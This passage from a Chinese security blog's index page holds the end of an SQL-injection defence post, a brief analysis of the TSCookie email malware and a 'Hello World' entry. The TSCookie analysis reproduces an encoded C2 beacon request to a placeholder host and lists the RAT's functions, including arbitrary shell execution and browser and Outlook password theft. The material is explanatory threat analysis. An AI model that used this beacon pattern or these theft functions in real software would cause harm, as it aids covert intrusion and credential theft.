class="line">  <span class="comment">//准备调用sql语句</span></span><br><span class="line">  $stmt =$mdb-&gt;prepare($sql,<span class="keyword">array</span>(<span class="string">'text'</span>));</span><br><span class="line">  <span class="comment">//执行sql语句</span></span><br><span class="line">  $rs =$stmt-&gt;execute(<span class="keyword">array</span>($author));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>从WAF角度：</p>
<p>​    可以配置设置waf策略，自定义策略！</p>
<hr>
<p>​                                                            <em>谢谢浏览!!!</em></p>
<hr>
<p>​</p>
</li>
</ol>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/web-security/">web security</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/04/11/关于恶意邮件TSCookie攻击的分析-1/"><span>关于恶意邮件TSCookie攻击的分析</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/04/11/关于恶意邮件TSCookie攻击的分析-1/" rel="bookmark">
        <time class="entry-date published" datetime="2018-04-11T13:56:37.000Z">
          2018-04-11
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>​       前段时间在安全客上看到了这个邮件病毒的介绍，然后就想着整理下对该恶意邮件的分析，好让自己对该攻击的过程有个深刻的理解。</p>
<p>​       首先呢！对TSCookie做一下分析：TSCookie本身只充当下载器功能，可以从服务器中下载其他的模块，则恶意模块就能扩展自己的功能。TSCookie会下载一个DLL文件，这个DLL文件具备各种功能，其中就包括渗透功能(下文简TSCookieRAT) TSCookie刚开始时会发送一个HTTP GET请求，如下所示。发出去的消息经过编码处理，嵌入在头部中的Cookie字段。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /Default.aspx HTTP/1.1</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Date: Thu, 18 Jan 2018 10:20:55 GMT</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Accept: */*</span><br><span class="line">Cookie: 1405D7CD01C6978E54E86DA9525E1395C4DD2F276DD28EABCC3F6201ADAA66F55C15352D29D0FFE51BC9D431EB23E8E58959653D9366E372B5CFCC49BB</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)</span><br><span class="line">Host:[host name]:443</span><br></pre></td></tr></table></figure>
<p> Cookie字段中包含的信息也经过RC4加密处理过（加密密钥为头部中的Date字段值）。恶意软件会将下载的模块加载到内存中，然后调用HTTP GET请求所获取的加载器来执行这个模块。</p>
<p><strong>TSCookie的行为分析</strong></p>
<p>​       该TSCookie使用HTTP协议与服务器进行通信，也会下载一个“模块”以及用来加载模块的一个“加载器”。恶意软件在资源区中嵌入了一个加密的DLL文件。当恶意软件执行时，就会将该DLL文件加载到内存中并加以执行。DLL文件会执行一些主要函数，比如与C&amp;C服务器通信（某些情况下，主要函数并没有经过加密处理，会直接存放在恶意软件中。）</p>
<p><strong>TSCookieRAT行为分析</strong></p>
<p>​       TSCookie在加载TSCookieRAT时会附带一些参数，比如C&amp;C服务器信息等。在执行时，TSCookieRAT会通过HTTP POST请求将被感染主机的信息发送给外部服务器（HTTP头部格式与TSCookie的一样）。TSCookieRAT会发送一个HTTP GET请求（HTTP头部载荷格式与TSCookie一样）。</p>
<p>​       通过这个请求，TSCookieRAT可以从C&amp;C服务器那接收命令，所执行的功能如下所示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、执行任意shell命令</span><br><span class="line"></span><br><span class="line">2、发送磁盘驱动器信息</span><br><span class="line"></span><br><span class="line">3、发送系统信息</span><br><span class="line"></span><br><span class="line">4、文件操作</span><br><span class="line"></span><br><span class="line">5、收集IE、Edge、Firefox、Chrome以及Outlook的密码</span><br></pre></td></tr></table></figure>
<p>命令执行的结果会发送给服务器，所使用的格式与第一个HTTP  POST请求一样。</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/security/">security</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/04/09/hello-world/"><span>Hello World</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/04/09/hello-world/" rel="bookmark">
        <time class="entry-date published" datetime="2018-04-09T10:08:06.710Z">
          2018-04-09
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="纪念自己的第一个blog"><a href="#纪念自己的第一个blog" class="headerlink" title="纪念自己的第一个blog"></a>纪念自己的第一个blog</h2><p>中间真的是跳了好多次坑。。。。</p>
<p>略略略</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    

    </div>

    
  </div>
</article>




<nav class="pagination">
  
  <a href="/" class="pagination-prev">Prev</a>
  
  
</nav>
    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2019 fanson
    
  </p>
</footer>
    
  </div>
</div>
<script type="text/javascript" src="/js/src/love.js"></script>
</body>
</html>